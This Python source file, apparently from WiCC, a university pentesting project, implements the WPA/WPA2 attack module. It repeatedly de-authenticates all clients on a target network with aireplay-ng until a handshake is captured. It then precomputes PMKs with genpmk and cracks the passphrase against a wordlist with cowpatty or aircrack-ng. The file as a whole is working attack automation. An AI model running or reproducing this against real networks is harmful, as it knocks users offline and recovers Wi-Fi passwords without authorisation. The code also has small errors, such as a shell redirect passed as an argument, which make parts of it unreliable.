#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wifi Cracking Camp)
    GUI tool for wireless pentesting on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil, Miguel Yanes Fernández and Adan Chalkley,
    as the Group Project for the 3rd year of the Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity
    at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
import threading
import time


class WPA(EncryptionType):

    def __init__(self, network, interface, wordlist, verbose_level, silent_attack, write_directory):
        """
        Constructor for the class WPA. Calls the parent's class constructor
        :param network: selected target network
        :param interface: name of the wireless interface
        :param wordlist: password wordlist directory
        :param verbose_level: verbose level set by main
        :param silent_attack: option to do a silent scan
        :param write_directory: directory to write the generated files

        :Author: Miguel Yanes Fernández
        """
        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack, write_directory)
        self.wordlist = wordlist
        self.pmk = ""

    def scan_network(self):
        """
        Scans the target network (calls the parent method to scan the network) and every 6 attemtpts, de-auths all
        clients on the network. Finishes once pyrit or cowpatty find a valid handshake
        :return: none

        :Author: Miguel Yanes Fernández
        """
        super().scan_network()
        self.show_message("scanned parent")
        valid_handshake = False

        self.calculate_pmk()

        pyrit_cmd = ['pyrit', '-r', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap', 'analyze']
        cowpatty_cmd = ['cowpatty', '-c', '-r', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
        de_auth_cmd = ['aireplay-ng', '-0', '5', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface]
        if self.silent_attack:
            super().show_message("Running silent attack (no de-authing)")
        else:
            second_iterator = 7  # when 15, de-auth's clients on the network

        while not valid_handshake:
            if not valid_handshake:
                time.sleep(1)
                if not self.silent_attack:
                    if second_iterator == 7:
                        self.show_message("de-authing . . .")
                        out, err = self.execute_command(de_auth_cmd)
                        second_iterator = 0
                    else: second_iterator += 1
            else:
                break
            time.sleep(0.5)
            pyrit_out, err = self.execute_command(pyrit_cmd)
            time.sleep(0.5)
            cowpatty_out, err = self.execute_command(cowpatty_cmd)
            valid_handshake = self.filter_pyrit_out(pyrit_out) or self.filter_cowpatty_out(cowpatty_out)

    def kill_genpmk(self):
        """
        Method to kill the genpmk process. This method is meant to be runned once the handshake has been captured.
        :return: none

        :Author: Miguel Yanes Fernández
        """
        pgrep_cmd = ['pgrep', 'genpmk']
        pgrep_out, pgrep_err = self.execute_command(pgrep_cmd)

        pgrep_out = pgrep_out.decode('utf-8')

        if pgrep_out != "":
            pids = pgrep_out.split('\n')
            for pid in pids:
                if pid != "":
                    self.execute_command(['kill', '-9', pid])  # kills all processes related with the process
                    self.show_message("killed pid " + pid)

    def add_wordlist(self, wordlist):
        """
        Sets the object variable wordlist
        :param wordlist: selected wordlist
        :return: none

        :author: Miguel Yanes Fernández
        """
        self.wordlist = wordlist

    def crack_network(self):
        """
        Cracks the dump file from the target network. First, if the pmk values have been pre-calculated, tries to crack
        the handhsake with those values. If not, cracks the handshake with aircrack and the selected wordlist
        :return: password of the cracked network ("" if no password was found)

        :Author: Miguel Yanes Fernández
        """
        if self.pmk != "":
            self.kill_genpmk()
            cowpatty_cmd = ['cowpatty', '-d', self.pmk, '-s', self.essid, '-r',
                            self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
            cowpatty_out, cowpatty_err = self.execute_command(cowpatty_cmd)
            cowpatty_out = cowpatty_out.decode('utf-8').split("\n")
            password = self.filter_cowpatty_psk(cowpatty_out)
            if password != "":
                self.show_message("password gathered from pmk")
                return password
            else:
                self.show_message("no password on pmk")

        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
                        '-w', self.wordlist, '>',
                        self.write_directory + '/aicrack-out']
        aircrack_out, aircrack_err = self.execute_command(aircrack_cmd)
        aircrack_out = aircrack_out.decode('utf-8')
        self.password = self.filter_aircrack(aircrack_out)
        return self.password

    def calculate_pmk(self):
        """
        Executes a thread with the genpmk command to pre-calculate PMK values with the selected wordlist and network.
        :return: none

        :Author: Miguel Yanes Fernández
        """
        self.pmk = self.write_directory + '/pmk_' + str(self.timestamp)
        genpmk_cmd = ['genpmk', '-f', self.wordlist, '-d', self.pmk, '-s', self.essid]
        genpmk_thread = threading.Thread(target=self.execute_command, args=(genpmk_cmd,))
        genpmk_thread.start()
        genpmk_thread.join(0)
        self.show_message("calculating pmk...")

    def filter_cowpatty_psk(self, output):
        """
        Filter the output from cowpatty when analysing the pmk values
        :param output: output of the cowpatty command
        :return: psk value (if any)

        :Author: Miguel Yanes Fernández
        """
        for line in output:
            if line == 'Unable to identify the PSK from the dictionary file. Try expanding your':
                self.show_message("No valid PSK")
                return ""
            elif 'The PSK is' in line:
                words = line.split(" ")
                psk = words[3][1:-2]  # [1:-2] is to remove the " " surrounding the psk
                self.show_message("Found PSK: " + psk)
                return psk
        return ""

    def filter_pyrit_out(self, output):
        """
        Filters the output from the pyrit command. Checks if pyrit finds any valid handshake
        :param output: output from the pyrit command
        :return: boolean whether it found a handshake or not

        :Author: Miguel Yanes Fernández
        """
        output = output.decode('utf-8')
        lines = output.split('\n')
        for line in lines:
            if line == 'No valid EAOPL-handshake + ESSID detected.':
                return False
            elif 'handshake(s)' in line:
                self.show_message("Pyrit handshake detected")
                return True
        return False

    def filter_cowpatty_out(self, output):
        """
        Filters the output from the cowpatty command to check if the dump file has any valid handshake
        :param output: output from the cowpatty command
        :return: boolean wether it found a valid handshake or not

        :Author: Miguel Yanes Fernández
        """
        output = output.decode('utf-8')
        lines = output.split('\n')
        for line in lines:
            if line == 'End of pcap capture file, incomplete four-way handshake exchange.  ' \
                       'Try using a different capture.':
                return False
            elif 'mount crack' in line:
                self.show_message("Cowpatty handshake detected")
                return True
        return False

    def filter_aircrack(self, output):
        """
        Filter the aircrack output to read the password (if any is found)
        :param output: output from the aicrack command
        :return: password (or "" if it wasn't found)

        :Author: Miguel Yanes Fernández
        """
        words = output.split(" ")
        next_1 = False
        next_2 = False
        for word in words:
            if word[:6] == "FOUND!":
                next_1 = True
            elif next_1:
                if not next_2:
                    next_2 = True
                else:
                    return word
        self.show_message("No password found in the capture file")
        return ""
